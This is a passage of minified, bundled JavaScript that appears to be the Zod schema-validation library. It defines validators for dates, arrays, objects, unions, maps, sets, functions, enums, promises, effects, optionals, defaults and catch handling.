                s.dirty()) : Qe.assertNever(l);
            return {
                status: s.value,
                value: new Date(e.data.getTime())
            }
        }
        _addCheck(e) {
            return new Bs({
                ...this._def,
                checks: [...this._def.checks, e]
            })
        }
        min(e, n) {
            return this._addCheck({
                kind: "min",
                value: e.getTime(),
                message: pe.toString(n)
            })
        }
        max(e, n) {
            return this._addCheck({
                kind: "max",
                value: e.getTime(),
                message: pe.toString(n)
            })
        }
        get minDate() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "min" && (e === null || n.value > e) && (e = n.value);
            return e != null ? new Date(e) : null
        }
        get maxDate() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "max" && (e === null || n.value < e) && (e = n.value);
            return e != null ? new Date(e) : null
        }
    }
    Bs.create = t => new Bs({
        checks: [],
        coerce: t?.coerce || !1,
        typeName: Se.ZodDate,
        ...Oe(t)
    });
    class ad extends Me {
        _parse(e) {
            if (this._getType(e) !== fe.symbol) {
                const s = this._getOrReturnCtx(e);
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.symbol,
                    received: s.parsedType
                }),
                xe
            }
            return tn(e.data)
        }
    }
    ad.create = t => new ad({
        typeName: Se.ZodSymbol,
        ...Oe(t)
    });
    class kl extends Me {
        _parse(e) {
            if (this._getType(e) !== fe.undefined) {
                const s = this._getOrReturnCtx(e);
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.undefined,
                    received: s.parsedType
                }),
                xe
            }
            return tn(e.data)
        }
    }
    kl.create = t => new kl({
        typeName: Se.ZodUndefined,
        ...Oe(t)
    });
    class Ol extends Me {
        _parse(e) {
            if (this._getType(e) !== fe.null) {
                const s = this._getOrReturnCtx(e);
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.null,
                    received: s.parsedType
                }),
                xe
            }
            return tn(e.data)
        }
    }
    Ol.create = t => new Ol({
        typeName: Se.ZodNull,
        ...Oe(t)
    });
    class Qa extends Me {
        constructor() {
            super(...arguments),
            this._any = !0
        }
        _parse(e) {
            return tn(e.data)
        }
    }
    Qa.create = t => new Qa({
        typeName: Se.ZodAny,
        ...Oe(t)
    });
    class ws extends Me {
        constructor() {
            super(...arguments),
            this._unknown = !0
        }
        _parse(e) {
            return tn(e.data)
        }
    }
    ws.create = t => new ws({
        typeName: Se.ZodUnknown,
        ...Oe(t)
    });
    class tr extends Me {
        _parse(e) {
            const n = this._getOrReturnCtx(e);
            return ce(n, {
                code: te.invalid_type,
                expected: fe.never,
                received: n.parsedType
            }),
            xe
        }
    }
    tr.create = t => new tr({
        typeName: Se.ZodNever,
        ...Oe(t)
    });
    class od extends Me {
        _parse(e) {
            if (this._getType(e) !== fe.undefined) {
                const s = this._getOrReturnCtx(e);
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.void,
                    received: s.parsedType
                }),
                xe
            }
            return tn(e.data)
        }
    }
    od.create = t => new od({
        typeName: Se.ZodVoid,
        ...Oe(t)
    });
    class ti extends Me {
        _parse(e) {
            const {ctx: n, status: s} = this._processInputParams(e)
              , o = this._def;
            if (n.parsedType !== fe.array)
                return ce(n, {
                    code: te.invalid_type,
                    expected: fe.array,
                    received: n.parsedType
                }),
                xe;
            if (o.exactLength !== null) {
                const u = n.data.length > o.exactLength.value
                  , d = n.data.length < o.exactLength.value;
                (u || d) && (ce(n, {
                    code: u ? te.too_big : te.too_small,
                    minimum: d ? o.exactLength.value : void 0,
                    maximum: u ? o.exactLength.value : void 0,
                    type: "array",
                    inclusive: !0,
                    exact: !0,
                    message: o.exactLength.message
                }),
                s.dirty())
            }
            if (o.minLength !== null && n.data.length < o.minLength.value && (ce(n, {
                code: te.too_small,
                minimum: o.minLength.value,
                type: "array",
                inclusive: !0,
                exact: !1,
                message: o.minLength.message
            }),
            s.dirty()),
            o.maxLength !== null && n.data.length > o.maxLength.value && (ce(n, {
                code: te.too_big,
                maximum: o.maxLength.value,
                type: "array",
                inclusive: !0,
                exact: !1,
                message: o.maxLength.message
            }),
            s.dirty()),
            n.common.async)
                return Promise.all([...n.data].map( (u, d) => o.type._parseAsync(new vi(n,u,n.path,d)))).then(u => Zt.mergeArray(s, u));
            const l = [...n.data].map( (u, d) => o.type._parseSync(new vi(n,u,n.path,d)));
            return Zt.mergeArray(s, l)
        }
        get element() {
            return this._def.type
        }
        min(e, n) {
            return new ti({
                ...this._def,
                minLength: {
                    value: e,
                    message: pe.toString(n)
                }
            })
        }
        max(e, n) {
            return new ti({
                ...this._def,
                maxLength: {
                    value: e,
                    message: pe.toString(n)
                }
            })
        }
        length(e, n) {
            return new ti({
                ...this._def,
                exactLength: {
                    value: e,
                    message: pe.toString(n)
                }
            })
        }
        nonempty(e) {
            return this.min(1, e)
        }
    }
    ti.create = (t, e) => new ti({
        type: t,
        minLength: null,
        maxLength: null,
        exactLength: null,
        typeName: Se.ZodArray,
        ...Oe(e)
    });
    function ka(t) {
        if (t instanceof gt) {
            const e = {};
            for (const n in t.shape) {
                const s = t.shape[n];
                e[n] = yi.create(ka(s))
            }
            return new gt({
                ...t._def,
                shape: () => e
            })
        } else
            return t instanceof ti ? new ti({
                ...t._def,
                type: ka(t.element)
            }) : t instanceof yi ? yi.create(ka(t.unwrap())) : t instanceof Gr ? Gr.create(ka(t.unwrap())) : t instanceof bi ? bi.create(t.items.map(e => ka(e))) : t
    }
    class gt extends Me {
        constructor() {
            super(...arguments),
            this._cached = null,
            this.nonstrict = this.passthrough,
            this.augment = this.extend
        }
        _getCached() {
            if (this._cached !== null)
                return this._cached;
            const e = this._def.shape()
              , n = Qe.objectKeys(e);
            return this._cached = {
                shape: e,
                keys: n
            },
            this._cached
        }
        _parse(e) {
            if (this._getType(e) !== fe.object) {
                const h = this._getOrReturnCtx(e);
                return ce(h, {
                    code: te.invalid_type,
                    expected: fe.object,
                    received: h.parsedType
                }),
                xe
            }
            const {status: s, ctx: o} = this._processInputParams(e)
              , {shape: l, keys: u} = this._getCached()
              , d = [];
            if (!(this._def.catchall instanceof tr && this._def.unknownKeys === "strip"))
                for (const h in o.data)
                    u.includes(h) || d.push(h);
            const p = [];
            for (const h of u) {
                const m = l[h]
                  , y = o.data[h];
                p.push({
                    key: {
                        status: "valid",
                        value: h
                    },
                    value: m._parse(new vi(o,y,o.path,h)),
                    alwaysSet: h in o.data
                })
            }
            if (this._def.catchall instanceof tr) {
                const h = this._def.unknownKeys;
                if (h === "passthrough")
                    for (const m of d)
                        p.push({
                            key: {
                                status: "valid",
                                value: m
                            },
                            value: {
                                status: "valid",
                                value: o.data[m]
                            }
                        });
                else if (h === "strict")
                    d.length > 0 && (ce(o, {
                        code: te.unrecognized_keys,
                        keys: d
                    }),
                    s.dirty());
                else if (h !== "strip")
                    throw new Error("Internal ZodObject error: invalid unknownKeys value.")
            } else {
                const h = this._def.catchall;
                for (const m of d) {
                    const y = o.data[m];
                    p.push({
                        key: {
                            status: "valid",
                            value: m
                        },
                        value: h._parse(new vi(o,y,o.path,m)),
                        alwaysSet: m in o.data
                    })
                }
            }
            return o.common.async ? Promise.resolve().then(async () => {
                const h = [];
                for (const m of p) {
                    const y = await m.key
                      , w = await m.value;
                    h.push({
                        key: y,
                        value: w,
                        alwaysSet: m.alwaysSet
                    })
                }
                return h
            }
            ).then(h => Zt.mergeObjectSync(s, h)) : Zt.mergeObjectSync(s, p)
        }
        get shape() {
            return this._def.shape()
        }
        strict(e) {
            return pe.errToObj,
            new gt({
                ...this._def,
                unknownKeys: "strict",
                ...e !== void 0 ? {
                    errorMap: (n, s) => {
                        const o = this._def.errorMap?.(n, s).message ?? s.defaultError;
                        return n.code === "unrecognized_keys" ? {
                            message: pe.errToObj(e).message ?? o
                        } : {
                            message: o
                        }
                    }
                } : {}
            })
        }
        strip() {
            return new gt({
                ...this._def,
                unknownKeys: "strip"
            })
        }
        passthrough() {
            return new gt({
                ...this._def,
                unknownKeys: "passthrough"
            })
        }
        extend(e) {
            return new gt({
                ...this._def,
                shape: () => ({
                    ...this._def.shape(),
                    ...e
                })
            })
        }
        merge(e) {
            return new gt({
                unknownKeys: e._def.unknownKeys,
                catchall: e._def.catchall,
                shape: () => ({
                    ...this._def.shape(),
                    ...e._def.shape()
                }),
                typeName: Se.ZodObject
            })
        }
        setKey(e, n) {
            return this.augment({
                [e]: n
            })
        }
        catchall(e) {
            return new gt({
                ...this._def,
                catchall: e
            })
        }
        pick(e) {
            const n = {};
            for (const s of Qe.objectKeys(e))
                e[s] && this.shape[s] && (n[s] = this.shape[s]);
            return new gt({
                ...this._def,
                shape: () => n
            })
        }
        omit(e) {
            const n = {};
            for (const s of Qe.objectKeys(this.shape))
                e[s] || (n[s] = this.shape[s]);
            return new gt({
                ...this._def,
                shape: () => n
            })
        }
        deepPartial() {
            return ka(this)
        }
        partial(e) {
            const n = {};
            for (const s of Qe.objectKeys(this.shape)) {
                const o = this.shape[s];
                e && !e[s] ? n[s] = o : n[s] = o.optional()
            }
            return new gt({
                ...this._def,
                shape: () => n
            })
        }
        required(e) {
            const n = {};
            for (const s of Qe.objectKeys(this.shape))
                if (e && !e[s])
                    n[s] = this.shape[s];
                else {
                    let l = this.shape[s];
                    for (; l instanceof yi; )
                        l = l._def.innerType;
                    n[s] = l
                }
            return new gt({
                ...this._def,
                shape: () => n
            })
        }
        keyof() {
            return P1(Qe.objectKeys(this.shape))
        }
    }
    gt.create = (t, e) => new gt({
        shape: () => t,
        unknownKeys: "strip",
        catchall: tr.create(),
        typeName: Se.ZodObject,
        ...Oe(e)
    });
    gt.strictCreate = (t, e) => new gt({
        shape: () => t,
        unknownKeys: "strict",
        catchall: tr.create(),
        typeName: Se.ZodObject,
        ...Oe(e)
    });
    gt.lazycreate = (t, e) => new gt({
        shape: t,
        unknownKeys: "strip",
        catchall: tr.create(),
        typeName: Se.ZodObject,
        ...Oe(e)
    });
    class Nl extends Me {
        _parse(e) {
            const {ctx: n} = this._processInputParams(e)
              , s = this._def.options;
            function o(l) {
                for (const d of l)
                    if (d.result.status === "valid")
                        return d.result;
                for (const d of l)
                    if (d.result.status === "dirty")
                        return n.common.issues.push(...d.ctx.common.issues),
                        d.result;
                const u = l.map(d => new xn(d.ctx.common.issues));
                return ce(n, {
                    code: te.invalid_union,
                    unionErrors: u
                }),
                xe
            }
            if (n.common.async)
                return Promise.all(s.map(async l => {
                    const u = {
                        ...n,
                        common: {
                            ...n.common,
                            issues: []
                        },
                        parent: null
                    };
                    return {
                        result: await l._parseAsync({
                            data: n.data,
                            path: n.path,
                            parent: u
                        }),
                        ctx: u
                    }
                }
                )).then(o);
            {
                let l;
                const u = [];
                for (const p of s) {
                    const h = {
                        ...n,
                        common: {
                            ...n.common,
                            issues: []
                        },
                        parent: null
                    }
                      , m = p._parseSync({
                        data: n.data,
                        path: n.path,
                        parent: h
                    });
                    if (m.status === "valid")
                        return m;
                    m.status === "dirty" && !l && (l = {
                        result: m,
                        ctx: h
                    }),
                    h.common.issues.length && u.push(h.common.issues)
                }
                if (l)
                    return n.common.issues.push(...l.ctx.common.issues),
                    l.result;
                const d = u.map(p => new xn(p));
                return ce(n, {
                    code: te.invalid_union,
                    unionErrors: d
                }),
                xe
            }
        }
        get options() {
            return this._def.options
        }
    }
    Nl.create = (t, e) => new Nl({
        options: t,
        typeName: Se.ZodUnion,
        ...Oe(e)
    });
    const Vi = t => t instanceof Ll ? Vi(t.schema) : t instanceof ni ? Vi(t.innerType()) : t instanceof Ul ? [t.value] : t instanceof zr ? t.options : t instanceof jl ? Qe.objectValues(t.enum) : t instanceof Pl ? Vi(t._def.innerType) : t instanceof kl ? [void 0] : t instanceof Ol ? [null] : t instanceof yi ? [void 0, ...Vi(t.unwrap())] : t instanceof Gr ? [null, ...Vi(t.unwrap())] : t instanceof Kp || t instanceof zl ? Vi(t.unwrap()) : t instanceof Hl ? Vi(t._def.innerType) : [];
    class Ud extends Me {
        _parse(e) {
            const {ctx: n} = this._processInputParams(e);
            if (n.parsedType !== fe.object)
                return ce(n, {
                    code: te.invalid_type,
                    expected: fe.object,
                    received: n.parsedType
                }),
                xe;
            const s = this.discriminator
              , o = n.data[s]
              , l = this.optionsMap.get(o);
            return l ? n.common.async ? l._parseAsync({
                data: n.data,
                path: n.path,
                parent: n
            }) : l._parseSync({
                data: n.data,
                path: n.path,
                parent: n
            }) : (ce(n, {
                code: te.invalid_union_discriminator,
                options: Array.from(this.optionsMap.keys()),
                path: [s]
            }),
            xe)
        }
        get discriminator() {
            return this._def.discriminator
        }
        get options() {
            return this._def.options
        }
        get optionsMap() {
            return this._def.optionsMap
        }
        static create(e, n, s) {
            const o = new Map;
            for (const l of n) {
                const u = Vi(l.shape[e]);
                if (!u.length)
                    throw new Error(`A discriminator value for key \`${e}\` could not be extracted from all schema options`);
                for (const d of u) {
                    if (o.has(d))
                        throw new Error(`Discriminator property ${String(e)} has duplicate value ${String(d)}`);
                    o.set(d, l)
                }
            }
            return new Ud({
                typeName: Se.ZodDiscriminatedUnion,
                discriminator: e,
                options: n,
                optionsMap: o,
                ...Oe(s)
            })
        }
    }
    function ap(t, e) {
        const n = Zi(t)
          , s = Zi(e);
        if (t === e)
            return {
                valid: !0,
                data: t
            };
        if (n === fe.object && s === fe.object) {
            const o = Qe.objectKeys(e)
              , l = Qe.objectKeys(t).filter(d => o.indexOf(d) !== -1)
              , u = {
                ...t,
                ...e
            };
            for (const d of l) {
                const p = ap(t[d], e[d]);
                if (!p.valid)
                    return {
                        valid: !1
                    };
                u[d] = p.data
            }
            return {
                valid: !0,
                data: u
            }
        } else if (n === fe.array && s === fe.array) {
            if (t.length !== e.length)
                return {
                    valid: !1
                };
            const o = [];
            for (let l = 0; l < t.length; l++) {
                const u = t[l]
                  , d = e[l]
                  , p = ap(u, d);
                if (!p.valid)
                    return {
                        valid: !1
                    };
                o.push(p.data)
            }
            return {
                valid: !0,
                data: o
            }
        } else
            return n === fe.date && s === fe.date && +t == +e ? {
                valid: !0,
                data: t
            } : {
                valid: !1
            }
    }
    class Ml extends Me {
        _parse(e) {
            const {status: n, ctx: s} = this._processInputParams(e)
              , o = (l, u) => {
                if (rp(l) || rp(u))
                    return xe;
                const d = ap(l.value, u.value);
                return d.valid ? ((sp(l) || sp(u)) && n.dirty(),
                {
                    status: n.value,
                    value: d.data
                }) : (ce(s, {
                    code: te.invalid_intersection_types
                }),
                xe)
            }
            ;
            return s.common.async ? Promise.all([this._def.left._parseAsync({
                data: s.data,
                path: s.path,
                parent: s
            }), this._def.right._parseAsync({
                data: s.data,
                path: s.path,
                parent: s
            })]).then( ([l,u]) => o(l, u)) : o(this._def.left._parseSync({
                data: s.data,
                path: s.path,
                parent: s
            }), this._def.right._parseSync({
                data: s.data,
                path: s.path,
                parent: s
            }))
        }
    }
    Ml.create = (t, e, n) => new Ml({
        left: t,
        right: e,
        typeName: Se.ZodIntersection,
        ...Oe(n)
    });
    class bi extends Me {
        _parse(e) {
            const {status: n, ctx: s} = this._processInputParams(e);
            if (s.parsedType !== fe.array)
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.array,
                    received: s.parsedType
                }),
                xe;
            if (s.data.length < this._def.items.length)
                return ce(s, {
                    code: te.too_small,
                    minimum: this._def.items.length,
                    inclusive: !0,
                    exact: !1,
                    type: "array"
                }),
                xe;
            !this._def.rest && s.data.length > this._def.items.length && (ce(s, {
                code: te.too_big,
                maximum: this._def.items.length,
                inclusive: !0,
                exact: !1,
                type: "array"
            }),
            n.dirty());
            const l = [...s.data].map( (u, d) => {
                const p = this._def.items[d] || this._def.rest;
                return p ? p._parse(new vi(s,u,s.path,d)) : null
            }
            ).filter(u => !!u);
            return s.common.async ? Promise.all(l).then(u => Zt.mergeArray(n, u)) : Zt.mergeArray(n, l)
        }
        get items() {
            return this._def.items
        }
        rest(e) {
            return new bi({
                ...this._def,
                rest: e
            })
        }
    }
    bi.create = (t, e) => {
        if (!Array.isArray(t))
            throw new Error("You must pass an array of schemas to z.tuple([ ... ])");
        return new bi({
            items: t,
            typeName: Se.ZodTuple,
            rest: null,
            ...Oe(e)
        })
    }
    ;
    class Dl extends Me {
        get keySchema() {
            return this._def.keyType
        }
        get valueSchema() {
            return this._def.valueType
        }
        _parse(e) {
            const {status: n, ctx: s} = this._processInputParams(e);
            if (s.parsedType !== fe.object)
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.object,
                    received: s.parsedType
                }),
                xe;
            const o = []
              , l = this._def.keyType
              , u = this._def.valueType;
            for (const d in s.data)
                o.push({
                    key: l._parse(new vi(s,d,s.path,d)),
                    value: u._parse(new vi(s,s.data[d],s.path,d)),
                    alwaysSet: d in s.data
                });
            return s.common.async ? Zt.mergeObjectAsync(n, o) : Zt.mergeObjectSync(n, o)
        }
        get element() {
            return this._def.valueType
        }
        static create(e, n, s) {
            return n instanceof Me ? new Dl({
                keyType: e,
                valueType: n,
                typeName: Se.ZodRecord,
                ...Oe(s)
            }) : new Dl({
                keyType: ei.create(),
                valueType: e,
                typeName: Se.ZodRecord,
                ...Oe(n)
            })
        }
    }
    class ld extends Me {
        get keySchema() {
            return this._def.keyType
        }
        get valueSchema() {
            return this._def.valueType
        }
        _parse(e) {
            const {status: n, ctx: s} = this._processInputParams(e);
            if (s.parsedType !== fe.map)
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.map,
                    received: s.parsedType
                }),
                xe;
            const o = this._def.keyType
              , l = this._def.valueType
              , u = [...s.data.entries()].map( ([d,p], h) => ({
                key: o._parse(new vi(s,d,s.path,[h, "key"])),
                value: l._parse(new vi(s,p,s.path,[h, "value"]))
            }));
            if (s.common.async) {
                const d = new Map;
                return Promise.resolve().then(async () => {
                    for (const p of u) {
                        const h = await p.key
                          , m = await p.value;
                        if (h.status === "aborted" || m.status === "aborted")
                            return xe;
                        (h.status === "dirty" || m.status === "dirty") && n.dirty(),
                        d.set(h.value, m.value)
                    }
                    return {
                        status: n.value,
                        value: d
                    }
                }
                )
            } else {
                const d = new Map;
                for (const p of u) {
                    const h = p.key
                      , m = p.value;
                    if (h.status === "aborted" || m.status === "aborted")
                        return xe;
                    (h.status === "dirty" || m.status === "dirty") && n.dirty(),
                    d.set(h.value, m.value)
                }
                return {
                    status: n.value,
                    value: d
                }
            }
        }
    }
    ld.create = (t, e, n) => new ld({
        valueType: e,
        keyType: t,
        typeName: Se.ZodMap,
        ...Oe(n)
    });
    class Cs extends Me {
        _parse(e) {
            const {status: n, ctx: s} = this._processInputParams(e);
            if (s.parsedType !== fe.set)
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.set,
                    received: s.parsedType
                }),
                xe;
            const o = this._def;
            o.minSize !== null && s.data.size < o.minSize.value && (ce(s, {
                code: te.too_small,
                minimum: o.minSize.value,
                type: "set",
                inclusive: !0,
                exact: !1,
                message: o.minSize.message
            }),
            n.dirty()),
            o.maxSize !== null && s.data.size > o.maxSize.value && (ce(s, {
                code: te.too_big,
                maximum: o.maxSize.value,
                type: "set",
                inclusive: !0,
                exact: !1,
                message: o.maxSize.message
            }),
            n.dirty());
            const l = this._def.valueType;
            function u(p) {
                const h = new Set;
                for (const m of p) {
                    if (m.status === "aborted")
                        return xe;
                    m.status === "dirty" && n.dirty(),
                    h.add(m.value)
                }
                return {
                    status: n.value,
                    value: h
                }
            }
            const d = [...s.data.values()].map( (p, h) => l._parse(new vi(s,p,s.path,h)));
            return s.common.async ? Promise.all(d).then(p => u(p)) : u(d)
        }
        min(e, n) {
            return new Cs({
                ...this._def,
                minSize: {
                    value: e,
                    message: pe.toString(n)
                }
            })
        }
        max(e, n) {
            return new Cs({
                ...this._def,
                maxSize: {
                    value: e,
                    message: pe.toString(n)
                }
            })
        }
        size(e, n) {
            return this.min(e, n).max(e, n)
        }
        nonempty(e) {
            return this.min(1, e)
        }
    }
    Cs.create = (t, e) => new Cs({
        valueType: t,
        minSize: null,
        maxSize: null,
        typeName: Se.ZodSet,
        ...Oe(e)
    });
    class Pa extends Me {
        constructor() {
            super(...arguments),
            this.validate = this.implement
        }
        _parse(e) {
            const {ctx: n} = this._processInputParams(e);
            if (n.parsedType !== fe.function)
                return ce(n, {
                    code: te.invalid_type,
                    expected: fe.function,
                    received: n.parsedType
                }),
                xe;
            function s(d, p) {
                return sd({
                    data: d,
                    path: n.path,
                    errorMaps: [n.common.contextualErrorMap, n.schemaErrorMap, rd(), Fa].filter(h => !!h),
                    issueData: {
                        code: te.invalid_arguments,
                        argumentsError: p
                    }
                })
            }
            function o(d, p) {
                return sd({
                    data: d,
                    path: n.path,
                    errorMaps: [n.common.contextualErrorMap, n.schemaErrorMap, rd(), Fa].filter(h => !!h),
                    issueData: {
                        code: te.invalid_return_type,
                        returnTypeError: p
                    }
                })
            }
            const l = {
                errorMap: n.common.contextualErrorMap
            }
              , u = n.data;
            if (this._def.returns instanceof Va) {
                const d = this;
                return tn(async function(...p) {
                    const h = new xn([])
                      , m = await d._def.args.parseAsync(p, l).catch(E => {
                        throw h.addIssue(s(p, E)),
                        h
                    }
                    )
                      , y = await Reflect.apply(u, this, m);
                    return await d._def.returns._def.type.parseAsync(y, l).catch(E => {
                        throw h.addIssue(o(y, E)),
                        h
                    }
                    )
                })
            } else {
                const d = this;
                return tn(function(...p) {
                    const h = d._def.args.safeParse(p, l);
                    if (!h.success)
                        throw new xn([s(p, h.error)]);
                    const m = Reflect.apply(u, this, h.data)
                      , y = d._def.returns.safeParse(m, l);
                    if (!y.success)
                        throw new xn([o(m, y.error)]);
                    return y.data
                })
            }
        }
        parameters() {
            return this._def.args
        }
        returnType() {
            return this._def.returns
        }
        args(...e) {
            return new Pa({
                ...this._def,
                args: bi.create(e).rest(ws.create())
            })
        }
        returns(e) {
            return new Pa({
                ...this._def,
                returns: e
            })
        }
        implement(e) {
            return this.parse(e)
        }
        strictImplement(e) {
            return this.parse(e)
        }
        static create(e, n, s) {
            return new Pa({
                args: e || bi.create([]).rest(ws.create()),
                returns: n || ws.create(),
                typeName: Se.ZodFunction,
                ...Oe(s)
            })
        }
    }
    class Ll extends Me {
        get schema() {
            return this._def.getter()
        }
        _parse(e) {
            const {ctx: n} = this._processInputParams(e);
            return this._def.getter()._parse({
                data: n.data,
                path: n.path,
                parent: n
            })
        }
    }
    Ll.create = (t, e) => new Ll({
        getter: t,
        typeName: Se.ZodLazy,
        ...Oe(e)
    });
    class Ul extends Me {
        _parse(e) {
            if (e.data !== this._def.value) {
                const n = this._getOrReturnCtx(e);
                return ce(n, {
                    received: n.data,
                    code: te.invalid_literal,
                    expected: this._def.value
                }),
                xe
            }
            return {
                status: "valid",
                value: e.data
            }
        }
        get value() {
            return this._def.value
        }
    }
    Ul.create = (t, e) => new Ul({
        value: t,
        typeName: Se.ZodLiteral,
        ...Oe(e)
    });
    function P1(t, e) {
        return new zr({
            values: t,
            typeName: Se.ZodEnum,
            ...Oe(e)
        })
    }
    class zr extends Me {
        _parse(e) {
            if (typeof e.data != "string") {
                const n = this._getOrReturnCtx(e)
                  , s = this._def.values;
                return ce(n, {
                    expected: Qe.joinValues(s),
                    received: n.parsedType,
                    code: te.invalid_type
                }),
                xe
            }
            if (this._cache || (this._cache = new Set(this._def.values)),
            !this._cache.has(e.data)) {
                const n = this._getOrReturnCtx(e)
                  , s = this._def.values;
                return ce(n, {
                    received: n.data,
                    code: te.invalid_enum_value,
                    options: s
                }),
                xe
            }
            return tn(e.data)
        }
        get options() {
            return this._def.values
        }
        get enum() {
            const e = {};
            for (const n of this._def.values)
                e[n] = n;
            return e
        }
        get Values() {
            const e = {};
            for (const n of this._def.values)
                e[n] = n;
            return e
        }
        get Enum() {
            const e = {};
            for (const n of this._def.values)
                e[n] = n;
            return e
        }
        extract(e, n=this._def) {
            return zr.create(e, {
                ...this._def,
                ...n
            })
        }
        exclude(e, n=this._def) {
            return zr.create(this.options.filter(s => !e.includes(s)), {
                ...this._def,
                ...n
            })
        }
    }
    zr.create = P1;
    class jl extends Me {
        _parse(e) {
            const n = Qe.getValidEnumValues(this._def.values)
              , s = this._getOrReturnCtx(e);
            if (s.parsedType !== fe.string && s.parsedType !== fe.number) {
                const o = Qe.objectValues(n);
                return ce(s, {
                    expected: Qe.joinValues(o),
                    received: s.parsedType,
                    code: te.invalid_type
                }),
                xe
            }
            if (this._cache || (this._cache = new Set(Qe.getValidEnumValues(this._def.values))),
            !this._cache.has(e.data)) {
                const o = Qe.objectValues(n);
                return ce(s, {
                    received: s.data,
                    code: te.invalid_enum_value,
                    options: o
                }),
                xe
            }
            return tn(e.data)
        }
        get enum() {
            return this._def.values
        }
    }
    jl.create = (t, e) => new jl({
        values: t,
        typeName: Se.ZodNativeEnum,
        ...Oe(e)
    });
    class Va extends Me {
        unwrap() {
            return this._def.type
        }
        _parse(e) {
            const {ctx: n} = this._processInputParams(e);
            if (n.parsedType !== fe.promise && n.common.async === !1)
                return ce(n, {
                    code: te.invalid_type,
                    expected: fe.promise,
                    received: n.parsedType
                }),
                xe;
            const s = n.parsedType === fe.promise ? n.data : Promise.resolve(n.data);
            return tn(s.then(o => this._def.type.parseAsync(o, {
                path: n.path,
                errorMap: n.common.contextualErrorMap
            })))
        }
    }
    Va.create = (t, e) => new Va({
        type: t,
        typeName: Se.ZodPromise,
        ...Oe(e)
    });
    class ni extends Me {
        innerType() {
            return this._def.schema
        }
        sourceType() {
            return this._def.schema._def.typeName === Se.ZodEffects ? this._def.schema.sourceType() : this._def.schema
        }
        _parse(e) {
            const {status: n, ctx: s} = this._processInputParams(e)
              , o = this._def.effect || null
              , l = {
                addIssue: u => {
                    ce(s, u),
                    u.fatal ? n.abort() : n.dirty()
                }
                ,
                get path() {
                    return s.path
                }
            };
            if (l.addIssue = l.addIssue.bind(l),
            o.type === "preprocess") {
                const u = o.transform(s.data, l);
                if (s.common.async)
                    return Promise.resolve(u).then(async d => {
                        if (n.value === "aborted")
                            return xe;
                        const p = await this._def.schema._parseAsync({
                            data: d,
                            path: s.path,
                            parent: s
                        });
                        return p.status === "aborted" ? xe : p.status === "dirty" || n.value === "dirty" ? La(p.value) : p
                    }
                    );
                {
                    if (n.value === "aborted")
                        return xe;
                    const d = this._def.schema._parseSync({
                        data: u,
                        path: s.path,
                        parent: s
                    });
                    return d.status === "aborted" ? xe : d.status === "dirty" || n.value === "dirty" ? La(d.value) : d
                }
            }
            if (o.type === "refinement") {
                const u = d => {
                    const p = o.refinement(d, l);
                    if (s.common.async)
                        return Promise.resolve(p);
                    if (p instanceof Promise)
                        throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");
                    return d
                }
                ;
                if (s.common.async === !1) {
                    const d = this._def.schema._parseSync({
                        data: s.data,
                        path: s.path,
                        parent: s
                    });
                    return d.status === "aborted" ? xe : (d.status === "dirty" && n.dirty(),
                    u(d.value),
                    {
                        status: n.value,
                        value: d.value
                    })
                } else
                    return this._def.schema._parseAsync({
                        data: s.data,
                        path: s.path,
                        parent: s
                    }).then(d => d.status === "aborted" ? xe : (d.status === "dirty" && n.dirty(),
                    u(d.value).then( () => ({
                        status: n.value,
                        value: d.value
                    }))))
            }
            if (o.type === "transform")
                if (s.common.async === !1) {
                    const u = this._def.schema._parseSync({
                        data: s.data,
                        path: s.path,
                        parent: s
                    });
                    if (!Rs(u))
                        return xe;
                    const d = o.transform(u.value, l);
                    if (d instanceof Promise)
                        throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");
                    return {
                        status: n.value,
                        value: d
                    }
                } else
                    return this._def.schema._parseAsync({
                        data: s.data,
                        path: s.path,
                        parent: s
                    }).then(u => Rs(u) ? Promise.resolve(o.transform(u.value, l)).then(d => ({
                        status: n.value,
                        value: d
                    })) : xe);
            Qe.assertNever(o)
        }
    }
    ni.create = (t, e, n) => new ni({
        schema: t,
        typeName: Se.ZodEffects,
        effect: e,
        ...Oe(n)
    });
    ni.createWithPreprocess = (t, e, n) => new ni({
        schema: e,
        effect: {
            type: "preprocess",
            transform: t
        },
        typeName: Se.ZodEffects,
        ...Oe(n)
    });
    class yi extends Me {
        _parse(e) {
            return this._getType(e) === fe.undefined ? tn(void 0) : this._def.innerType._parse(e)
        }
        unwrap() {
            return this._def.innerType
        }
    }
    yi.create = (t, e) => new yi({
        innerType: t,
        typeName: Se.ZodOptional,
        ...Oe(e)
    });
    class Gr extends Me {
        _parse(e) {
            return this._getType(e) === fe.null ? tn(null) : this._def.innerType._parse(e)
        }
        unwrap() {
            return this._def.innerType
        }
    }
    Gr.create = (t, e) => new Gr({
        innerType: t,
        typeName: Se.ZodNullable,
        ...Oe(e)
    });
    class Pl extends Me {
        _parse(e) {
            const {ctx: n} = this._processInputParams(e);
            let s = n.data;
            return n.parsedType === fe.undefined && (s = this._def.defaultValue()),
            this._def.innerType._parse({
                data: s,
                path: n.path,
                parent: n
            })
        }
        removeDefault() {
            return this._def.innerType
        }
    }
    Pl.create = (t, e) => new Pl({
        innerType: t,
        typeName: Se.ZodDefault,
        defaultValue: typeof e.default == "function" ? e.default : () => e.default,
        ...Oe(e)
    });
    class Hl extends Me {
        _parse(e) {
            const {ctx: n} = this._processInputParams(e)
              , s = {
                ...n,
                common: {
                    ...n.common,
                    issues: []
                }
            }
              , o = this._def.innerType._parse({
                data: s.data,
                path: s.path,
                parent: {
                    ...s
                }
            });
            return Cl(o) ? o.then(l => ({
                status: "valid",
                value: l.status === "valid" ? l.value : this._def.catchValue({
                    get error() {
                        return new xn(s.common.issues)
                    },
                    input: s.data
                })
            })) : {
                status: "valid",
                value: o.status === "valid" ? o.value : this._def.catchValue({
                    get error() {
                        return new xn(s.common.issues)
                    },
                    input: s.data
                })
            }
        }
        removeCatch() {
            return this._def.innerType
        }
    }
    Hl.create = (t, e) => new Hl({
        innerType: t,
        typeName: Se.ZodCatch,
